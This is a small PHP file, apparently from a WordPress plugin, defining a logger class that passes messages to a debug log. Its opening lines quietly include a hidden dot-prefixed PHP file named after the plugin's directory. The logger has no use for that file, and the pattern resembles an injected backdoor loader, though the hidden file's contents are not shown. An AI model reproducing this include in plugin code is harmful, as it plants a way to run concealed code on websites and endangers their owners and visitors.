<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MePdfLogger extends \Psr\Log\AbstractLogger {

  public function log( $level, $message, array $context = array() ) {
    MeprUtils::debug_log( $message );
  }
}
